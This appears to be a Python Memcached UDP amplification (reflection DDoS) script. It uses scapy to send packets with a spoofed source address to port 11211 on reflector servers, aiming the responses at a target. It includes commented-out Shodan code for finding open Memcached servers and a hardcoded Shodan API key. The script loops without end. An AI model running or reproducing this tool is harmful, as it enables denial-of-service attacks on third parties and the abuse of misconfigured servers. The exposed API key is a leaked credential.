#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield


# keys = Path("./api.txt")
# if keys.is_file():
#     with open('api.txt', 'r') as file:
#         SHODAN_API_KEY=file.readline().rstrip('\n')
# else:
#     file = open('api.txt', 'w')
#     SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
#     file.write(SHODAN_API_KEY)
#     print('[~] File written: ./api.txt')
#     file.close()

while True:
    # api = shodan.Shodan('SUGDxXYdnAfKHIWiOHDAzTWKL17UozTx')
    print('')
    try:
        # results = api.search('product:"Memcached" port:11211')
        # print('[~] Number of bots: %s' % results['total'])
        # ip_array = []
        # for result in results['matches']:
        #     ip_array.append(result['ip_str'])

        ip_array = ['45.156.109.47']
        target = "1.3.3.7"
        targetport = 53
        power = 1

        data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
            setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
            getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
            print("[+] Payload transformed")

        print('[*] Ready to engage target %s ' % target)
        for i in ip_array:
            print('[+] Sending forged UDP packet to: %s' % i)
            with suppress_stdout():
                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)), dport=11211)/Raw(load=data), count=power)

        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
    except shodan.APIError as e:
        print(f'error {str(e)}')
        print('[•] Exiting Platform. Have a wonderful day.')
        break
